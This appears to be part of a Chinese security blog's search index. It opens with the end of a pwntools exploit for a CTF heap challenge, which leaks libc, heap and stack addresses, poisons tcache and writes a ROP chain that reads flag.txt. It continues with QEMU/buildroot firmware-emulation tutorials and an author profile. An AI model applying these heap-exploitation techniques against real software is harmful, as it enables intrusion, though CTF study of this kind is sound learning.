class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">c = process(<span class="string">&#x27;./tototo&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./tototo&#x27;</span>)</span><br><span class="line">libc=ELF(b<span class="number">&#x27;</span>/lib/x86_64-linux-gnu/libc.so<span class="number">.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debg():</span><br><span class="line">gdb.attach(c,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b <span class="built_in">malloc</span></span><br><span class="line">b <span class="built_in">free</span></span><br><span class="line">b *$rebase(<span class="number">0x1866</span>)</span><br><span class="line">b *$rebase(<span class="number">0x1a73</span>)</span><br><span class="line"></span><br><span class="line">b *$rebase(<span class="number">0x14ed</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(idx, size):</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>is:<span class="string">&#x27;, b&#x27;</span><span class="number">1&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="string">&quot;index?\n&quot;</span>, str(idx).encode())</span><br><span class="line">c.sendlineafter(b<span class="string">&quot;size?\n&quot;</span>, str(size).encode())</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(idx):</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>is:<span class="string">&#x27;, b&#x27;</span><span class="number">2&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="string">&quot;Which one?&quot;</span>, str(idx).encode())</span><br><span class="line"> </span><br><span class="line">def edit(idx, msg):</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>is:<span class="string">&#x27;, b&#x27;</span><span class="number">3&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="string">&quot;Which one?\n&quot;</span>, str(idx).encode())</span><br><span class="line">c.sendlineafter(b<span class="string">&quot;new content?\n&quot;</span>, msg[<span class="number">9</span>:])</span><br><span class="line"> </span><br><span class="line">def show(idx):</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>is:<span class="string">&#x27;, b&#x27;</span><span class="number">4&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="string">&quot;Which one?\n&quot;</span>, str(idx).encode())</span><br><span class="line"> </span><br><span class="line">def add2(idx, size):</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>is:<span class="string">&#x27;, b&#x27;</span><span class="number">5&#x27;</span>)</span><br><span class="line">c.sendlineafter(b<span class="string">&quot;index?\n&quot;</span>, str(idx).encode())</span><br><span class="line">c.sendlineafter(b<span class="string">&quot;size?\n&quot;</span>, str(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0</span>, <span class="number">0x620</span>)</span><br><span class="line">add2(<span class="number">1</span>, <span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(c.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))<span class="number">-0x1ecbe0</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc_base=&quot;</span>+hex(libc_base))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">heap = u64(c.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;heap=&quot;</span>+hex(heap))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>*<span class="number">0x208</span>+p64(<span class="number">0x211</span>)+ p64(libc_base+libc.sym[<span class="string">&#x27;_environ&#x27;</span>]))  #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x200</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">stack</span> = u64(c.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;stack=&quot;</span>+hex(<span class="built_in">stack</span>))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">free</span>(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023b6a</span> <span class="meta"># pop rdi ; ret</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span> <span class="meta"># pop rdx ; pop r12 ; ret</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span> <span class="meta"># pop rsi ; ret</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x0000000000036174</span> <span class="meta"># pop rax ; ret</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000630a9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>*<span class="number">0x208</span>+p64(<span class="number">0x211</span>)+ p64(<span class="built_in">stack</span> - <span class="number">0x150</span><span class="number">-1</span>))  #<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;the addr is i want to write to=&quot;</span>+hex(<span class="built_in">stack</span> - <span class="number">0x150</span><span class="number">-1</span>))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;flag_addr=&quot;</span>+hex(<span class="built_in">stack</span><span class="number">-0x150</span><span class="number">-1</span>+<span class="number">9</span>+<span class="number">26</span>*<span class="number">8</span>))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;pop_rdi=&quot;</span>+hex(pop_rdi))</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">debg()</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x200</span>) #stack_chunk</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">orw = [<span class="number">0</span>,<span class="number">0</span>,pop_rdi,<span class="built_in">stack</span><span class="number">-0x150</span><span class="number">-1</span>+<span class="number">9</span>+<span class="number">24</span>*<span class="number">8</span> , pop_rsi, <span class="number">0</span>, pop_rdx,<span class="number">0</span>, pop_rax,<span class="number">2</span>, syscall, #O <span class="number">1</span></span><br><span class="line">   pop_rdi, <span class="number">3</span>, pop_rsi, <span class="built_in">stack</span><span class="number">-0x150</span><span class="number">-1</span>+<span class="number">9</span>+<span class="number">24</span>*<span class="number">8</span>+<span class="number">8</span>, pop_rdx, <span class="number">0x30</span>, pop_rax,<span class="number">0</span>, syscall, #R <span class="number">13</span></span><br><span class="line">   pop_rdi, <span class="number">1</span>, pop_rax, <span class="number">1</span>, syscall,   #W</span><br><span class="line">   b<span class="number">&#x27;f</span>lag.txt<span class="number">&#x27;</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>, b<span class="number">&#x27;0&#x27;</span>+flat(orw))</span><br><span class="line"><span class="built_in">log</span>.success(c.recv(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>固件仿真基础环境搭建</title>
      <link href="/2023/03/23/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/03/23/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p><em>这边采用的是buildroot+qemu的方式进行环境搭建</em></p><h5 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h5><p><strong>buildroot</strong>：Buildroot 是 Linux 平台上一个构建嵌入式 Linux 系统的框架，我们可以使用该框架进行仿真固件</p><ul><li>可以使用buildroot自带的配置文件<code>buildroot/config</code>选择对应的配置<code>make 配置文件名</code>程序就会自动下载所需要的文件并编译，make输出的文件会在outputs文件下，自动生成的运行脚本在<code>buildroot/outputs/images</code></li></ul><p><img src="https://s2.loli.net/2023/03/23/i2XwRmG8onWg1cN.png"></p><ul><li>也可以通过<code>make menuconfig</code>进行类似内核编译前配置的界面对所需要的功能进行选择，save后，make进行编译即可</li></ul><p><img src="https://s2.loli.net/2023/03/23/UTpbZhAFKfumJ2s.png"></p><p>笔者这边使用的就是buildroot自动下载好的文件以及运行脚本(buildroot生成的运行脚本也是基于使用qemu进行模拟的)，固件模拟环境可能需要我们改动一下配置文件才能实现qemu虚拟机和主机互通或者实现自己需要的需求，一般情况<code>make menuconfig</code>里面都可以选择</p><h5 id="qemu虚拟机与虚拟机互通"><a href="#qemu虚拟机与虚拟机互通" class="headerlink" title="qemu虚拟机与虚拟机互通"></a>qemu虚拟机与虚拟机互通</h5><p>目的为可以让虚拟机访问固件启动的web页面和gdbserver调试</p><p><strong>相关介绍一</strong></p><p>tap&#x2F;tun接口：运行在内核的虚拟机接口，我们在搭建的时候就是通过tun口进行交互，tap会输出完整的以太网帧，tun会输出ip报头，搭建的时候使用tunctl创建tun口</p><p><a href="https://www.zhaohuabing.com/post/2020-02-24-linux-taptun/">tun&#x2F;tap详细介绍和使用其实现一些功能</a></p><ol><li>自己编写一个启动脚本，使用brctl创建虚拟网桥并配置ip地址</li><li>使用tunctl创建名为tap0的tun接口并配置ip</li><li>将tap0口接入虚拟网桥</li><li>我们还需要将buildroot自动生成的启动脚本与tap0口相连</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/bin/sh</span></span><br><span class="line">sudo brctl addbr virbr0</span><br><span class="line">sudo ifconfig virbr0 192.168.247.55/24 up</span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.247.56/24 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br><span class="line">sudo ./start-qemu.sh</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">(</span><br><span class="line">BINARIES_DIR=<span class="string">&quot;<span class="variable">$&#123;0%/*&#125;</span>/&quot;</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$&#123;BINARIES_DIR&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> = <span class="string">&quot;serial-only&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    EXTRA_ARGS=<span class="string">&#x27;-nographic&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    EXTRA_ARGS=<span class="string">&#x27;-serial stdio&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/home/davis/buildroot/output/host/bin:<span class="variable">$&#123;PATH&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">exec</span> qemu-system-mipsel -M malta -kernel vmlinux</span><br><span class="line">-drive file=rootfs.ext2,format=raw -append <span class="string">&quot;rootwait root=/dev/sda&quot;</span> </span><br><span class="line">-drive file=/share.img,format=raw  -net nic,macaddr=00:16:3e:00:00:01 </span><br><span class="line">-net user  </span><br><span class="line">-net tap,ifname=tap0,script=no,downscript=no  <span class="variable">$&#123;EXTRA_ARGS&#125;</span></span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完成上述操作后就可以ping通虚拟机了</p><h5 id="qemu虚拟机与虚拟机传输文件"><a href="#qemu虚拟机与虚拟机传输文件" class="headerlink" title="qemu虚拟机与虚拟机传输文件"></a>qemu虚拟机与虚拟机传输文件</h5><p>wait a minuet ：说这个的原因是因为，笔者这边使用buildroot自生成的脚本运行，竟然没有service指令，那就开不了ssh，加之有没有网，所以这边使用mount挂载的方式传输</p><ol><li><p>可以使用<code>qemu-img</code>创建或者使用<code>dd</code>命令创建<br>eg：<code>qemu-img xxx.img 500m</code>    或者     <code>dd if=/dev/zero of=./xxx.img bs=1M count=500</code></p></li><li><p>使用<code>mkfs.ext4/ext2  xxx.img</code> 进行格式化</p></li><li><p>mount将xxx.img挂载到一个文件夹下，可以在&#x2F;tmp&#x2F; 随便创建一个挂载，此时将需要传输的文件放入该文件夹</p></li><li><p>修改qemu启动时的参数加入这个xxx.img文件作为一块硬盘，参考上面的运行脚本</p></li><li><p>使用fdisk -l查看加入的硬盘名字挂载到&#x2F;dev&#x2F;sdx</p></li></ol><p><img src="https://s2.loli.net/2023/03/23/UFQ9MSKH1mC5byf.png"></p><ol start="7"><li>在qemu虚拟机中使用<code>mount -t ext4（如果mkfs格式化为ext4的话） /xxx</code><br>将其挂载到&#x2F;xxx，具体看你想挂载到哪里</li><li>此时qemu虚拟机里就有对应的文件了</li></ol><br><p><strong>还有第二种方法</strong></p><ol><li>在宿主机上运行<code>python3 -m http.server  port(随便一个未占用的即可)</code>，<code>python2 -m SimpleHTTPServer port</code></li><li>在模拟的虚拟机中就可以直接使用<code>wget 宿主机ip：port/文件</code>下载</li></ol><p>注：buildroot自动生成的qemu启动脚本中要求 命令行参数1需要为<code>serial-only</code>否则我们按<code>ctrl c</code>会直接退出qemu</p><br><p>注：buildroot自动生成的qemu启动脚本中要求 命令行参数1需要为<code>serial-only</code>否则我们按<code>ctrl c</code>会直接退出qemu</p><p><a href="https://cloud.tencent.com/developer/article/2066731?from=15425&areaSource=102001.1&traceId=l2kBkZlnO3s1USUbw9FDx">mount指令详解</a><a href="https://blog.csdn.net/weixin_36179469/article/details/116775194">qemu虚拟机与宿主机使用mount进行文件传输</a></p><p><a href="https://blog.csdn.net/weixin_36179469/article/details/116775194">qemu虚拟机与宿主机使用mount进行文件传输</a></p><p><a href="https://www.bbsmax.com/A/1O5Eo8V8z7/">mount挂载实质以及不同参数挂载的区别，强烈建议学习</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 固件仿真 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qemu使用介绍及参数</title>
      <link href="/2023/03/21/qemu%E5%8F%82%E6%95%B0/"/>
      <url>/2023/03/21/qemu%E5%8F%82%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>使用者模式</strong></p><p><strong><code>使用者模式：</code></strong></p><ol><li><p>直接用对应架构的qemu运行对应程序(静态链接程序)<br>eg：<code>./qemu-mips file</code></p></li><li><p>使用sudo chroot更改程序执行根目录为当前目录(动态链接程序)<br>eg：<code>sudo chroot .   ./qemu-mips file</code></p></li></ol><p><strong>系统模式</strong></p><p><a href="https://people.debian.org/~aurel32/qemu/">debian下载qemu需要使用的文件</a></p><p> 参数</p><p><code>-initrd</code> 指定初始化ram映像，系统在引导过程临时将其挂载为根目录来辅助引导过程，搜索linux文件系统格式就可以知道可以有那些格式，文件中包含引导过程需要的一些工具，一般我们要指定的话可以去debian官网下载，其中包含内核文件和initrd文件直接使用即可</p><p><a href="https://baike.baidu.com/item/initrd/3239796?fr=aladdin">initrd详细介绍</a><br><a href="https://zhuanlan.zhihu.com/p/582152006">自制initrd文件范例</a></p><p><code>-hdx</code> 指定硬盘映像，也是直接去debian下载就好，自制的话这里随便找了几篇文章以供自阅和大家参考。<code>默认是从abcd开始的所以可以是-hda</code></p><p><a href="https://www.qemu.org/docs/master/system/images.html#quick-start-for-disk-image-creation">使用qemu-img制作硬盘映像-官方文档</a><br><a href="https://blog.csdn.net/z770816239/article/details/53514418">qemu-img制作·····—博客</a><br><a href="https://wenku.baidu.com/view/4de0d4fb30d4b14e852458fb770bf78a65293ac0.html?_wkts_=1679361010659&bdQuery=qemu+%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0+-append">使用dd，mkfs自制硬盘映像</a></p><p><code>-M</code> 指定板子型号，通过搜索-M tab 列出的内容，理论来说我们仿真的时候就会确定对应路由器应该是可以搜到对应的板子型号</p><p><code>-net 网卡名</code>  模拟环境启动后创建网卡</p><p><code>-net tap</code>  一般用于指定qemu虚拟机连接到虚拟机的tap接口<br>eg：-net tap,ifname&#x3D;tap名字</p><p>eg：<code>-net eth0，macaddr=mac地址，ifname=top0</code>(设置改网卡为网关)，<code>script=no,downscript=no</code> ，后面两个如果是配置网关则加上去，默认网络配置脚本是 <code>/etc/qemu-ifup</code>，默认网络取消配置脚本是 <code>/etc/qemu-ifdown</code>。使用<code>script=no</code>或<code>downscript=no</code>禁用脚本执行。</p><p><code>-nographic</code> 关闭图形窗口</p><p><code>-drive</code>  指定驱动映像，可以使用其代替-hda使用<br>eg：if&#x3D;sd,file&#x3D;debian_wheezy_armhf_standard.qcow2<br>if 接口类型     file   映像文件</p><p><code>-device</code> 一般用不到暂放</p><p><a href="https://blog.csdn.net/qq_43644573/article/details/126998814">device参考</a></p><p><code>-append</code> 指定命令行启动参数，这里不知道为什么大家的启动脚本都是设置为root&#x3D;&#x2F;dev&#x2F;sda1，意思就是指定&#x2F;dev&#x2F;sda1设备为根目录，其他指定参数大家想要了解的话可以参考下面的文章</p><p><a href="https://www.cnblogs.com/kerndev/p/5537408.html">linux启动参数</a></p><p><a href="https://www.dandelioncloud.cn/article/details/1555737208827367425">内核启动参数详解，下面一点的位置有介绍需要那些参数，文件前是分析内核启动文件</a></p><p>启动脚本参考</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips \  </span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \  </span><br><span class="line">    -hda debian_wheezy_mips_standard.qcow2 \  </span><br><span class="line">    -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \  </span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \  </span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \  </span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p><a href="https://www.qemu.org/docs/master/system/invocation.html">qemu官方文档，不要多想不知道看官方文档为上策</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简介</title>
      <link href="/2023/03/11/%E7%AE%80%E4%BB%8B/"/>
      <url>/2023/03/11/%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="hi-guys，welcome-to-my-blog"><a href="#hi-guys，welcome-to-my-blog" class="headerlink" title="hi guys，welcome to my blog."></a>hi guys，welcome to my blog.</h3><p>I am a pwner currently studying iot security and other knowledge of binary</p><br><p><strong>Here are some of my habits：</strong></p><ul><li>发布的文章可能不是最终版本，后面会进行增补(每周会写周报所以不会等到全部弄完发布)</li><li>如果时间充裕的话基本上会固定周二上传一次</li><li>文章内容会根据自己对该问题的理解程度以及巧妙的方法进行详写与略写</li><li>对于文章中写到的待补充之类的话语，如果后面没有忘记的话会更新</li></ul><p><strong>What I plan to learn next is as follows：</strong></p><ul><li>复现iot相方面的漏洞</li><li>做参加的ctf比赛题目</li><li>学习fuzz，看看re相关的书籍</li><li>学习linux内核</li><li>unix网络编程，计算机网络，tcp&#x2F;ip三卷(unix网络编程ing，其他will)</li></ul><p><strong>My contact information</strong></p><p>QQ：2223242484</p><p>如果文章中出现问题可以联系我，感谢</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
